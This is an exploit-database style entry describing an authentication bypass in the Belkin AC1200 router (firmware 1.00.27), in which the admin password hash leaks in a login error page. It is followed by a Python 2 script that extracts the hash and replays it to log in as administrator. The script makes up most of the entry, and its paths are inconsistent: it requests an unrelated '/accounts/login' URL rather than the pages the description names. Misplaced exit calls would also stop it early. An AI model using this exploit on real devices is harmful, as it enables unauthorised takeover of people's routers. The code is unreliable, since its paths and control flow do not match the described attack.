'''
# Exploit Title: Belkin Router AC1200, Firmware: 1.00.27 - Authentication Bypass
# Date: 5/11/2016
# Exploit Author: Gregory Smiley
# Contact: gsx0r.sec@gmail.com
# Vendor Homepage: http://www.belkin.com
# Version: Firmware: 1.00.27
# Tested on:F9K1113 v1


#1. Description:

#The Belkin AC1200 is vulnerable to authentication bypass due to it performing client side
#authentication after you attempt to login after already having failed a login. That webpage, loginpserr.stm contains the md5 hash value of the administrators password. This can be
#exploited by extracting that hash value, and passing it in the pws field in a post request to
#login.cgi.

#I would like to note that I contacted Belkin on several occasions
#and gave them plenty of time to reply/fix the issue before releasing this entry.



#2. Proof:

#Line 55 of loginpserr.stm contains the javascript code:

#var password = "md5hashofpassword";


#3. Exploit:
'''

#!/usr/bin/python


import urllib

import urllib2

import sys


router = raw_input('Enter IP address of your AC1200 to test: ')

page = urllib2.urlopen('https://'+router+'/accounts/login?client_id=ads-api').read()

test_page = page


vuln_string = 'var password = "'

if vuln_string in test_page:

	print 'Router is vulnerable.'
	answer = raw_input('Would you like to exploit the target? Y/N : ')


else:


	print 'Router is not vulnerable.'
	print 'exiting...'

sys.exit()


if (answer == 'y') or (answer == 'Y'):


	extract = test_page.split(vuln_string, 1)[1] #These two lines extract the leaked hash value
	_hash = extract.partition('"')[0] #from /loginpserr.stm using quotes as a delimiter


else:


	if (answer == 'n') or (answer == 'N'):
		print 'exiting...'

sys.exit()


#Assemble the POST request to /login.cgi



headers = {


'Host': router,

'Connection': 'keep-alive',

'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0',

'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',

'Accept-Language' : 'en-US,en;q=0.5',

'Accept-Encoding' : 'gzip, deflate',

'Referer' : 'http://'+router+'/',

'Connection': 'keep-alive',

'Content-Type': 'application/x-www-form-urlencoded'

}


data = {



'totalMSec':'0',

'pws': _hash,

'url':'status.stm',

'arc_action':'login',

'pws_temp': ''

}


data = urllib.urlencode(data)


#Sends the POST request with the hash in the pws field


req = urllib2.Request('https://'+router+'/accounts/login?client_id=ads-api', data, headers)


response = urllib2.urlopen(req)

the_page = response.read()


print 'Exploit successful.'

print 'You are now free to navigate to http://'+router+'/ ...as admin ;)'
